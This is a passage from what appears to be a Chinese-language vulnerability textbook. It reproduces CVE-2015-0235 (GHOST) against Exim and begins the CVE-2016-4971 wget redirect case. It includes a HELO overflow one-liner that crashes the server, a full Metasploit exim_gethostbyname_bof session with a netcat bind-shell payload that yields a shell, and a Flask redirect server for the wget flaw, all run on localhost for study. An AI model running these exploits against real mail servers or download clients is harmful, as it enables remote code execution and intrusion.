esmtp = FALSE;
goto HELO_EHLO;
case EHLO_CMD:
HAD(SCH_EHLO);
hello = US"EHLO";
esmtp = TRUE;
// 当 SMTP 命令为 HELO 或 EHLO 时，执行下面的过程
HELO_EHLO: /* Common code for HELO and EHLO */
cmd_list[CMD_LIST_HELO].is_mail_cmd = FALSE;
cmd_list[CMD_LIST_EHLO].is_mail_cmd = FALSE;
/* Reject the HELO if its argument was invalid or non-existe
nt. A
successful check causes the argument to be saved in malloc s
tore. */
if (!check_helo(smtp_cmd_data)) // 检查 HELO 的格式必须是 IP 地址
{
[...]
break;
}
[...]
helo_verified = helo_verify_failed = FALSE;
if (helo_required || helo_verify)
{
BOOL tempfail = !smtp_verify_helo(); // 验证 HELO 是否
有效
if (!helo_verified)
{
if (helo_required)
{
[...]
}
HDEBUG(D_all) debug_printf("%s verification failed but
1529
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
host is in "
"helo_try_verify_hosts\n", hello);
}
}
继续看函数 smtp_verify_helo() ：
// src/src/smtp_in.c
BOOL
smtp_verify_helo(void)
{
[...]
if (!helo_verified)
{
int rc;
host_item h;
h.name = sender_helo_name;
h.address = NULL;
h.mx = MX_NONE;
h.next = NULL;
HDEBUG(D_receive) debug_printf("getting IP address for %s\n"
,
sender_helo_name);
rc = host_find_byname(&h, NULL, 0, NULL, TRUE);
if (rc == HOST_FOUND || rc == HOST_FOUND_LOCAL)
[....]
}
}
1530
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
// src/src/host.c
int
host_find_byname(host_item *host, uschar *ignore_target_hosts, i
nt flags,
uschar **fully_qualified_name, BOOL local_host_check)
{
[...]
for (i = 1; i name, af, &error_nu
m);
else
{
#if HAVE_GETIPNODEBYNAME
hostdata = getipnodebyname(CS host->name, af, 0, &error_num)
;
#else
hostdata = gethostbyname2(CS host->name, af);
error_num = h_errno;
#endif
}
#else /* not HAVE_IPV6 */
if (running_in_test_harness)
hostdata = host_fake_gethostbyname(host->name, AF_INET, &err
or_num);
else
{
hostdata = gethostbyname(CS host->name);
error_num = h_errno;
}
#endif /* HAVE_IPV6 */
1531
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
函数 host_find_byname 调用了 gethostbyname() 和 gethostbyname2()
分别针对 IPv4 和 IPv6 进行处理，也就是在这里可以触发漏洞函数。
这一次我们输入这样的一串字符，即可导致溢出：
$ python -c "print 'HELO ' + '0'*$((0x500-16*1-2*8-1-8))"
但是程序可能还是正常在运行的，我们多输入执行几次就会触发漏洞，发生段错
误，连接被断开。
Connection closed by foreign host.
$ dmesg | grep exim
[28929.172015] traps: exim4[3288] general protection ip:7fea4146
5c1d sp:7fff471f0dd0 error:0 in libc-2.15.so[7fea413f6000+1b5000
]
[28929.493632] traps: exim4[3301] general protection ip:7fea42e2
cc9c sp:7fff471f0d90 error:0 in exim4[7fea42db6000+dc000]
[28929.562113] traps: exim4[3304] general protection ip:7fea42e2
cc9c sp:7fff471f0d90 error:0 in exim4[7fea42db6000+dc000]
[28929.631573] exim4[3307]: segfault at 100000008 ip 00007fea42e
2d226 sp 00007fff471e8b50 error 4 in exim4[7fea42db6000+dc000]
其实对于 Exim 的攻击已经集成到了 Metasploit 框架中，我们来尝试一下，正好学
习一下这个强大的框架，仿佛自己也可以搞渗透测试。先关掉debug模式的程序，
重新以正常的样子打开：
$ /etc/init.d/exim4 restart
msf > search exim
Matching Modules
================
Name Disclosure Date
Rank Description
1532
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
---- ---------------
---- -----------
exploit/linux/smtp/exim4_dovecot_exec 2013-05-03
excellent Exim and Dovecot Insecure Configuration Command Inj
ection
exploit/linux/smtp/exim_gethostbyname_bof 2015-01-27
great Exim GHOST (glibc gethostbyname) Buffer Overflow
exploit/unix/local/exim_perl_startup 2016-03-10
excellent Exim "perl_startup" Privilege Escalation
exploit/unix/smtp/exim4_string_format 2010-12-07
excellent Exim4 string_format Function Heap Buffer Overflow
exploit/unix/webapp/wp_phpmailer_host_header 2017-05-03
average WordPress PHPMailer Host Header Command Injection
msf > use exploit/linux/smtp/exim_gethostbyname_bof
msf exploit(linux/smtp/exim_gethostbyname_bof) > set RHOST 127.0
.0.1
RHOST => 127.0.0.1
msf exploit(linux/smtp/exim_gethostbyname_bof) > set SENDER_HOST
_ADDRESS 127.0.0.1
SENDER_HOST_ADDRESS => 127.0.0.1
msf exploit(linux/smtp/exim_gethostbyname_bof) > set payload cmd
/unix/bind_netcat
payload => cmd/unix/bind_netcat
msf exploit(linux/smtp/exim_gethostbyname_bof) > show options
Module options (exploit/linux/smtp/exim_gethostbyname_bof):
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST 127.0.0.1 yes The target ad
dress
RPORT 25 yes The target po
rt (TCP)
SENDER_HOST_ADDRESS 127.0.0.1 yes The IPv4 addr
ess of the SMTP client (Metasploit), as seen by the SMTP server
(Exim)
1533
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
Payload options (cmd/unix/bind_netcat):
Name Current Setting Required Description
---- --------------- -------- -----------
LPORT 4444 yes The listen port
RHOST 127.0.0.1 no The target address
Exploit target:
Id Name
-- ----
0 Automatic
msf exploit(linux/smtp/exim_gethostbyname_bof) > exploit
[*] Started bind handler
[*] 127.0.0.1:25 - Checking if target is vulnerable...
[+] 127.0.0.1:25 - Target is vulnerable.
[*] 127.0.0.1:25 - Trying information leak...
[+] 127.0.0.1:25 - Successfully leaked_arch: x64
[+] 127.0.0.1:25 - Successfully leaked_addr: 7fea43824720
[*] 127.0.0.1:25 - Trying code execution...
[+] 127.0.0.1:25 - Brute-forced min_heap_addr: 7fea438116cb
[+] 127.0.0.1:25 - Brute-force SUCCESS
[+] 127.0.0.1:25 - Please wait for reply...
[*] Command shell session 1 opened (127.0.0.1:34327 -> 127.0.0.1
:4444) at 2018-01-26 17:29:07 +0800
whoami
Debian-exim
id
uid=115(Debian-exim) gid=125(Debian-exim) groups=125(Debian-exim
)
Bingo!!!成功获得了一个反弹 shell。
对于该脚本到底是怎么做到的，本人水平有限，还有待分析。。。
1534
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
参考资料
CVE-2015-0235 Detail
Qualys Security Advisory CVE-2015-0235
Exim - 'GHOST' glibc gethostbyname Buffer Overflow (Metasploit)
Exim ESMTP 4.80 - glibc gethostbyname Denial of Service
1535
7.1.3 CVE-2016-4971 wget 任意文件上传漏洞
7.1.3 CVE-2016-4971 wget 任意文件上传漏
洞
漏洞描述
漏洞复现
漏洞分析
参考资料
下载文件
漏洞描述
wget 是一个从网络上自动下载文件的工具，支持通过 HTTP、HTTPS、FTP 三种
最常见的 TCP/IP 协议。
漏洞发生在将 HTTP 服务重定向到 FTP 服务时，wget 会默认选择相信 HTTP 服务
器，并且直接使用重定向的 FTP URL，而没有对其进行二次验证或对下载文件名
进行适当的处理。如果攻击者提供了一个恶意的 URL，通过这种重定向可能达到任
意文件的上传的问题，并且文件名和文件内容也是任意的。
漏洞复现
推荐使用的环境 备注
操作系统 Ubuntu 16.04 体系结构：64 位
漏洞软件 wget 版本号：1.17.1
所需软件 vsftpd 版本号：3.0.3
首先需要安装 ftp 服务器：
$ sudo apt-get install vsftpd
修改其配置文件 /etc/vsftpd.conf ，使匿名用户也可以访问：
1536
7.1.3 CVE-2016-4971 wget 任意文件上传漏洞
# Allow anonymous FTP? (Disabled by default).
anonymous_enable=YES
然后我们需要一个 HTTP 服务，这里选择使用 Flask：
$ sudo pip install flask
创建两个文件 noharm.txt 和 harm.txt，假设前者是我们请求的正常文件，后者是重
定位后的恶意文件，如下：
$ ls
harm.txt httpServer.py noharm.txt
$ cat noharm.txt
"hello world"
$ cat harm.txt
"you've been hacked"
$ sudo cp harm.txt /srv/ftp
$ sudo python httpServer.py
* Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
httpServer.py 代码如下：
#!/usr/bin/env python
from flask import Flask, redirect
app = Flask(__name__)
@app.route("/noharm.txt")
def test():
return redirect("ftp://127.0.0.1/harm.txt")
if __name__ == "__main__":
app.run(host="0.0.0.0",port=80)
接下来在另一个 shell 里（记得切换到一个不一样的目录），执行下面的语句：
1537
7.1.3 CVE-2016-4971 wget 任意文件上传漏洞
$ ls | grep harm
$ wget --version | head -n1
GNU Wget 1.17.1 built on linux-gnu.
$ wget 0.0.0.0/noharm.txt
--2018-01-29 15:30:35-- http://0.0.0.0/noharm.txt
Connecting to 0.0.0.0:80... connected.
HTTP request sent, awaiting response... 302 FOUND
Location: ftp://127.0.0.1/harm.txt [following]
--2018-01-29 15:30:35-- ftp://127.0.0.1/harm.txt
=> ‘noharm.txt’
Connecting to 127.0.0.1:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done. ==> PWD ... done.
==> TYPE I ... done. ==> CWD not needed.
==> SIZE harm.txt ... 21
==> PASV ... done. ==> RETR harm.txt ... done.
Length: 21 (unauthoritative)
noharm.txt 100%[=============================
=================>] 21 --.-KB/s in 0s
2018-01-29 15:30:35 (108 KB/s) - ‘noharm.txt’ saved [21]
$ ls | grep harm
noharm.txt
$ cat noharm.txt
"you've been hacked"
可以看到发生了重定向，虽然下载的文件内容是重定位后的文件的内容
（harm.txt），但文件名依然是一开始请求的文件名（noharm.txt），完全没有问
题。
这样看来，该系统上的 wget 虽然是 1.17.1，但估计已经打过补丁了。我们直接编
译安装原始的版本：
1538
7.1.3 CVE-2016-4971 wget 任意文件上传漏洞
$ sudo apt-get install libneon27-gnutls-dev
$ wget https://ftp.gnu.org/gnu/wget/wget-1.17.1.tar.gz
$ tar zxvf wget-1.17.1.tar.gz
$ cd wget-1.17.1
$ ./configure